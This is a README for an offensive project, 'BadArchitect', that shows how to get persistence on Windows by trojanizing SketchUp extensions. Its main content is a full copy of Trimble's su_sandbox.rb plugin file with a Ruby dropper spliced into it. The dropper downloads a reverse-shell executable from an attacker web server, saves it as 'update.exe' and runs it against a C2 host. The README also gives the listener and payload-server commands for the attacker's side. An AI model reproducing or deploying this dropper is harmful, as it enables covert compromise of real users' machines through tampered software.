# BadArchitect
The purpose of this project is to show you how to abuse SketchUp to make persistence on Windows.

# What's SketchUp
> SketchUp, formerly Google Sketchup, is a 3D modeling computer program for a wide range of drawing applications such as architectural, interior design, landscape architecture, civil and mechanical engineering, film and video game design. It is available as a web-based application, SketchUp Free, a freeware version, SketchUp Make, and a paid version with additional functionality, SketchUp Pro.
> SketchUp is owned by Trimble Inc., a mapping, surveying and navigation equipment company. There is an online library of free model assemblies (e.g. windows, doors, automobiles), 3D Warehouse, to which users may contribute models. The program includes drawing layout functionality, allows surface rendering in variable "styles", supports third-party "plug-in" programs hosted on a site called Extension Warehouse to provide other capabilities (e.g. near photo-realistic rendering) and enables placement of its models within Google Earth. 
[Wikipedia](https://en.wikipedia.org/wiki/SketchUp)

# Ruby
Since SketchUp 4 a Ruby interpreter is available to improve the extensions development. [Here's](https://github.com/SketchUp/sketchup-ruby-api-tutorials/tree/master/tutorials/01_hello_cube) an example of how to create one.

# Abusing the Ruby interpreter
The idea behind this trick is quite simple: infect any installed extension with a ruby code which downloads and execute a tcp reverse  shell (**DON'T USE A TCP REVERSE SHELL IN REAL SCENARIOS. YOU WILL EASILY GET BUSTED AND GETTING BUSTED FOR THIS IS REALLY DUMB**).

### Ruby dropper
Edit the file `dropper.rb` and define the values for the following variables:
 - webserver - Server which host the malicious binary
 - clientbinary - Name of the malicious binary
 - c2_host - Server which will receive the reverse shell
 - c2_port - Port used by the reverse shell

### Binary client
You can find on this repository the golang script and the compiled version responsible for executing the reverse shell, but as said before, don't use this tcp reverse shell payload in a real world scenario.

### Infection process
For this example we'll use the `su_sandbox.rb`, which can be located on Windows at `$HOME/AppData/Roaming/SkechUp/SkechUp [YEAR]/SkechUp/Plugins`. All we need to do is edit this file and insert the content of `dropper.rb`. At the end the file should be like this:
```ruby
# Copyright 2017, Trimble Inc

# This software is provided as an example of using the Ruby interface
# to SketchUp.

# Permission to use, copy, modify, and distribute this software for
# any purpose and without fee is hereby granted, provided that the above
# copyright notice appear in all copies.

# THIS SOFTWARE IS PROVIDED "AS IS" AND WITHOUT ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.

#-----------------------------------------------------------------------------
# Name        :   Sandbox Extension Manager
# Description :   A script that loads the Sandbox Tools as an extension to
#                 SketchUp
# Menu Item   :   N/A
# Context Menu:   N/A
# Usage       :   N/A
# Date        :   11/18/2004
# Type        :   N/A
#-----------------------------------------------------------------------------

require 'sketchup.rb'
require 'extensions.rb'
require 'langhandler.rb'
require 'open-uri.rb'

webserver = "192.168.1.100:8080" clientbinary = "client-rev-tcp.exe"
envuser = ENV["HOME"]
path = "#{envuser}/Downloads/update.exe"

File.open(path, "wb") do |saved_file|
  # the following "open" is provided by open-uri
  open("http://#{webserver}/#{clientbinary}", "rb") do |read_file|
    saved_file.write(read_file.read)
  end
end

c2_host = "192.168.0.10"
c2_port = "8090"
system("START /B \"SketchUp\" #{path} -hostname #{c2_host} -port #{c2_port}")

module Sketchup::SandboxTools
$tStrings = LanguageHandler.new("sandbox.strings")

#Register the Sandbox Tools with SU's extension manager
meshToolsExtension = SketchupExtension.new($tStrings.GetString(
  "Sandbox Tools"), "su_sandbox/sandboxmenus")

meshToolsExtension.description=$tStrings.GetString(
  "Adds items to the Draw and Tools menus for creating and editing " +
  "organic shapes such as terrain.")
# Version History:
# SketchUp 2018: 2.3.2
meshToolsExtension.version = "2.3.1"
meshToolsExtension.creator = "SketchUp"
meshToolsExtension.copyright = "2017, Trimble Inc."

#Default on in pro and off in free
Sketchup.register_extension meshToolsExtension, Sketchup.is_pro?


end # module Sketchup::SandboxTools
```

### Reverse shell
Now for everything to work make sure to validate the following steps before starting the reverse shell: 
- Validate if the server responsible for the payload download is running (`python2.7 -m SimpleHTTPServer 8080`)
- Validate if the server responsible for receiving the reverse shell is running (`ncat -lkvp 8090`)
And for the final step open a new instance of SketchUp then you should receive a shell just like on the video below:
[![SketchUp - Reverse Shell Dropper](http://img.youtube.com/vi/pDOF7tR8tmQ/0.jpg)](http://www.youtube.com/watch?v=pDOF7tR8tmQ)

